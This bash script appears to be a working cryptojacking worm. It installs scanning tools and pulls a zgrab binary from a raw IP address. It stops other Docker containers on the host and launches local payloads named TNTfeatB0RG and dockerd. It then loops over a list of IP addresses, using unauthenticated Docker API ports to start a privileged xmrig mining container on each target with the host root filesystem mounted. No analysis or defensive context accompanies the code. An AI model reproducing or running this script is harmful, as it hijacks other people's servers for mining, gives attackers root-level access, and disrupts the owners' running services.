#!/bin/bash
RATE_TO_SCAN=500000

if type apt-get 2>/dev/null 1>/dev/null; then 
    apt-get update --fix-missing 2>/dev/null 1>/dev/null; 
    apt-get install -y wget curl jq bash masscan libpcap-dev 
fi

if type yum 2>/dev/null 1>/dev/null; then 
    yum clean all 2>/dev/null 1>/dev/null; 
    yum install -y wget curl jq bash masscan libpcap-devel 
fi

if ! type zgrab 2>/dev/null 1>/dev/null; then 
    wget http://45.9.148.85/bin/zgrab -O /usr/bin/zgrab && chmod +x /usr/bin/zgrab 
fi

if ! type docker 2>/dev/null; then 
    curl -sLk https://get.docker.com | bash 
fi

docker stop $(docker ps | grep -v 'CONTAINER' | grep -v 'tntpwner2\|b0rgdrone24\|dockgeddon' | awk '{print $1}')
clear
echo ""
echo ""
echo "Starting scan..."

chmod +x /usr/bin/zgrab
chmod +x /root/dockerd
chmod +x /root/TNTfeatB0RG

/root/TNTfeatB0RG
nice -n -20 /root/dockerd || /root/dockerd

dAPIpwn(){
    ip_list_file=$1
    port=$2
    while read -r ipaddy
    do
        TARGET=$ipaddy:$port
        echo '##################################################'
        echo $TARGET
        timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host xululol/xmrig
    done < "$ip_list_file"
}

while true 
do
    dAPIpwn ip_list.txt 2375
    dAPIpwn ip_list.txt 2376
    dAPIpwn ip_list.txt 2377
    dAPIpwn ip_list.txt 4244
    dAPIpwn ip_list.txt 4243
done
